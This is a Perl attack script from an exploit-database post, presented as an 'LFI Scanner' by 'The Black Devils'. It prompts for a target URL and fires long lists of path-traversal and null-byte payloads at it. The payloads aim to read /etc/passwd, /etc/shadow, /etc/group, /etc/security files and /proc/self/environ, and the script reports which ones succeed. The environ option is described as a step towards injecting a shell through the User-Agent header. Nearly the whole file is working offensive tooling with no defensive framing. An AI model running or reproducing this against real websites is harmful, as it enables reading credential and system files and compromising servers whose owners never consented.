#!/usr/bin/perl
#1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
#0     _                   __           __       __                     1
#1   /' \            __  /'__`\        /\ \__  /'__`\                   0
#0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
#1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
#0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
#1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
#0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
#1                  \ \____/ >> Exploit database separated by exploit   0
#0                   \/___/          type (local, remote, DoS, etc.)    1
#1                                                                      1
#0  [+] Site            : 1337day.com                                   0
#1  [+] Support e-mail  : submit[at]1337day.com                         1
#0                                                                      0
#1               #########################################              1
#0               I'm The Black Devils member from Inj3ct0r Team         1
#1               #########################################              0
#0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1

    use HTTP::Request;
    use LWP::UserAgent;
system("title The Black Devils");
system("color 1e");
system ("cls");
print "    |=======================================================|\n";
print "    |= [!] Name : LFI Scanner Ver 1.0.0 Perl               =|\n";
print "    |= [!] Author  : The Black Devils                      =|\n";
print "    |= [!] Mail: mr.k4rizma(at)gmail(dot)com               =|\n";
print "    |=======================================================|\n";
print "\n\n";
sleep (1);
print "\t\t\t\t WELCOME\n";
print "\n\n";
menu:;
print "\tMenu:\n";
print "\t ID [1] => Passwd,Log";
print "\t[Scan Files Of /etc/ Directory]\n";
print "\t ID [2] =>Environ";
print "\t[Scan Environ File For Inject Shell By U-Agent]\n";
print"\n";
print "\t\t Select ID For Start Scanner :";
$menu = <>;
if ($menu =~ /1/){
  goto lfi;
	}
	if ($menu =~ /2/){
		goto env;
	}
	else {
		print"\n\n";
		print "\t\tUnknow Command\n";
		goto menu;
	};


lfi:;
    print "\n\n";
    print "\t\t\tWelcome To /etc/ Section With New Method\n\n";
    print "\t Insert Target (ex: http://www.xxx.com/index.php?page=)\n";
    print "\t Target :";
    $host=<STDIN>;
    chomp($host);
    if($host !~ /http:\/\//) { $host = "http://$host"; };

print "\n\n";
print "\t\t*-*-*-*-*-* Start Scanning /etc/ Section *-*-*-*-*-*\n";
print "\n\n";
@lfi = ('../etc/passwd',
'../../etc/passwd',
'../../../etc/passwd',
'../../../../etc/passwd',
'../../../../../etc/passwd',
'../../../../../../etc/passwd',
'../../../../../../../etc/passwd',
'../../../../../../../../etc/passwd',
'../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../etc/passwd',
'....//etc/passwd',
'....//....//etc/passwd',
'....//....//....//etc/passwd',
'....//....//....//....//etc/passwd',
'....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//....//etc/passwd',
'../../etc/passwd%00',
'../../../etc/passwd%00',
'../../../../etc/passwd%00',
'../../../../../etc/passwd%00',
'../../../../../../etc/passwd%00',
'../../../../../../../etc/passwd%00',
'../../../../../../../../etc/passwd%00',
'../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../etc/passwd%00',
'....//etc/passwd%00',
'....//....//etc/passwd%00',
'....//....//....//etc/passwd%00',
'....//....//....//....//etc/passwd%00',
'....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//....//etc/passwd%00',
'../etc/shadow',
'../../etc/shadow',
'../../../etc/shadow',
'../../../../etc/shadow',
'../../../../../etc/shadow',
'../../../../../../etc/shadow',
'../../../../../../../etc/shadow',
'../../../../../../../../etc/shadow',
'../../../../../../../../../etc/shadow',
'../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../../etc/shadow',
'../etc/shadow%00',
'../../etc/shadow%00',
'../../../etc/shadow%00',
'../../../../etc/shadow%00',
'../../../../../etc/shadow%00',
'../../../../../../etc/shadow%00',
'../../../../../../../etc/shadow%00',
'../../../../../../../../etc/shadow%00',
'../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../../etc/shadow%00',
'../etc/group',
'../../etc/group',
'../../../etc/group',
'../../../../etc/group',
'../../../../../etc/group',
'../../../../../../etc/group',
'../../../../../../../etc/group',
'../../../../../../../../etc/group',
'../../../../../../../../../etc/group',
'../../../../../../../../../../etc/group',
'../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../../etc/group',
'../etc/group%00',
'../../etc/group%00',
'../../../etc/group%00',
'../../../../etc/group%00',
'../../../../../etc/group%00',
'../../../../../../etc/group%00',
'../../../../../../../etc/group%00',
'../../../../../../../../etc/group%00',
'../../../../../../../../../etc/group%00',
'../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../../etc/group%00',
'../etc/security/group',
'../../etc/security/group',
'../../../etc/security/group',
'../../../../etc/security/group',
'../../../../../etc/security/group',
'../../../../../../etc/security/group',
'../../../../../../../etc/security/group',
'../../../../../../../../etc/security/group',
'../../../../../../../../../etc/security/group',
'../../../../../../../../../../etc/security/group',
'../../../../../../../../../../../etc/security/group',
'../etc/security/group%00',
'../../etc/security/group%00',
'../../../etc/security/group%00',
'../../../../etc/security/group%00',
'../../../../../etc/security/group%00',
'../../../../../../etc/security/group%00',
'../../../../../../../etc/security/group%00',
'../../../../../../../../etc/security/group%00',
'../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../../etc/security/group%00',
'../etc/security/passwd',
'../../etc/security/passwd',
'../../../etc/security/passwd',
'../../../../etc/security/passwd',
'../../../../../etc/security/passwd',
'../../../../../../etc/security/passwd',
'../../../../../../../etc/security/passwd',
'../../../../../../../../etc/security/passwd',
'../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../../etc/security/passwd',
'../etc/security/passwd%00',
'../../etc/security/passwd%00',
'../../../etc/security/passwd%00',
'../../../../etc/security/passwd%00',
'../../../../../etc/security/passwd%00',
'../../../../../../etc/security/passwd%00',
'../../../../../../../etc/security/passwd%00',
'../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../../etc/security/passwd%00',
'../etc/security/user',
'../../etc/security/user',
'../../../etc/security/user',
'../../../../etc/security/user',
'../../../../../etc/security/user',
'../../../../../../etc/security/user',
'../../../../../../../etc/security/user',
'../../../../../../../../etc/security/user',
'../../../../../../../../../etc/security/user',
'../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../../etc/security/user',
'../etc/security/user%00',
'../../etc/security/user%00',
'../../../etc/security/user%00',
'../../../../etc/security/user%00',
'../../../../../etc/security/user%00',
'../../../../../../etc/security/user%00',
'../../../../../../../etc/security/user%00',
'../../../../../../../../etc/security/user%00',
'../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../../etc/security/user%00');


foreach $scan(@lfi){

$url = $host.$scan;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($request);
if ($response->is_success && $response->content =~ /root:x:/) { $msg = Vulnerability;}
else { $msg = "Not Infected";}
print "$scan..........[$msg]\n";
}
env:;
    print "\n\n";
    print "\t\t\tWelcom To Environ Section\n\n";
    print "\t Insert Target (ex: http://www.site.com/index.php?page=)\n";
    print "\t Target :";
    $host=<STDIN>;
    chomp($host);
    if($host !~ /http:\/\//) { $host = "http://$host"; };

print "\n\n";
print "\t\t*-*-*-*-*-* Start Scanning Environ  *-*-*-*-*-*\n";
print "\n\n";

@env = ('../proc/self/environ',
'../../proc/self/environ',
'../../../proc/self/environ',
'../../../../proc/self/environ',
'../../../../../proc/self/environ',
'../../../../../../proc/self/environ',
'../../../../../../../proc/self/environ',
'../../../../../../../../proc/self/environ',
'../../../../../../../../../proc/self/environ',
'../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../proc/self/environ',
'../proc/self/environ%00',
'../../proc/self/environ%00',
'../../../proc/self/environ%00',
'../../../../proc/self/environ%00',
'../../../../../proc/self/environ%00',
'../../../../../../proc/self/environ%00',
'../../../../../../../proc/self/environ%00',
'../../../../../../../../proc/self/environ%00',
'../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../proc/self/environ%00');

foreach $scan_env(@env){

$url = $host.$scan_env;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($request);
if ($response->is_success && $response->content =~ /HTTP_ACCEPT/ && $response->content =~ /HTTP_HOST/) { $msg = Vulnerability;}
else { $msg = "Not Infected";}
print "$scan_env..........[$msg]\n";
}
sleep (5);
return 1 ;
